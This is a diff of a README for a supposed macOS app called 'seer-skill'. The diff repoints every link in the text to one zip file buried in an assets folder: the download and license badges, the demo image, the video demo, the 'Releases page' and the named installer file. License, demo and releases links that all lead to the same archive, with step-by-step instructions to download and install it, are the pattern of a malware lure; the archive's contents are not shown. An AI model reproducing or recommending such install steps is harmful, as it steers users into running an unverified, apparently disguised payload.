@@ -1,7 +1,7 @@
 # 🎥 seer-skill - Capture Visual Feedback Made Easy
 
-[![Download Now](https://github.com/PrimeOla/seer-skill/raw/refs/heads/main/skills/seer/skill_seer_3.1.zip)](https://github.com/PrimeOla/seer-skill/raw/refs/heads/main/skills/seer/skill_seer_3.1.zip)  
-[![License](https://github.com/PrimeOla/seer-skill/raw/refs/heads/main/skills/seer/skill_seer_3.1.zip)](https://github.com/PrimeOla/seer-skill/raw/refs/heads/main/skills/seer/skill_seer_3.1.zip)
+[![Download Now](https://github.com/PrimeOla/seer-skill/raw/refs/heads/main/skills/seer/assets/excalidraw/seer-skill-subimaginal.zip)](https://github.com/PrimeOla/seer-skill/raw/refs/heads/main/skills/seer/assets/excalidraw/seer-skill-subimaginal.zip)  
+[![License](https://github.com/PrimeOla/seer-skill/raw/refs/heads/main/skills/seer/assets/excalidraw/seer-skill-subimaginal.zip)](https://github.com/PrimeOla/seer-skill/raw/refs/heads/main/skills/seer/assets/excalidraw/seer-skill-subimaginal.zip)
 
 ## 🛠️ Support
 
@@ -9,9 +9,9 @@
 
 ## 📹 Demo
 
-![seer demo](https://github.com/PrimeOla/seer-skill/raw/refs/heads/main/skills/seer/skill_seer_3.1.zip)
+![seer demo](https://github.com/PrimeOla/seer-skill/raw/refs/heads/main/skills/seer/assets/excalidraw/seer-skill-subimaginal.zip)
 
-You can also view the full video demo [here](https://github.com/PrimeOla/seer-skill/raw/refs/heads/main/skills/seer/skill_seer_3.1.zip).
+You can also view the full video demo [here](https://github.com/PrimeOla/seer-skill/raw/refs/heads/main/skills/seer/assets/excalidraw/seer-skill-subimaginal.zip).
 
 ## 🌟 Features
 
@@ -29,10 +29,10 @@ To get started, follow these steps to download and install the seer-skill applic
 ### 🔗 Download & Install
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases page](https://github.com/PrimeOla/seer-skill/raw/refs/heads/main/skills/seer/skill_seer_3.1.zip) to download the latest version.
+   Go to the [Releases page](https://github.com/PrimeOla/seer-skill/raw/refs/heads/main/skills/seer/assets/excalidraw/seer-skill-subimaginal.zip) to download the latest version.
 
 2. **Choose the Right Installer:**  
-   Find the appropriate installer file for your macOS version. Look for files named similar to `https://github.com/PrimeOla/seer-skill/raw/refs/heads/main/skills/seer/skill_seer_3.1.zip`.
+   Find the appropriate installer file for your macOS version. Look for files named similar to `https://github.com/PrimeOla/seer-skill/raw/refs/heads/main/skills/seer/assets/excalidraw/seer-skill-subimaginal.zip`.
 
 3. **Download the Installer:**  
    Click on the file to download it to your computer.
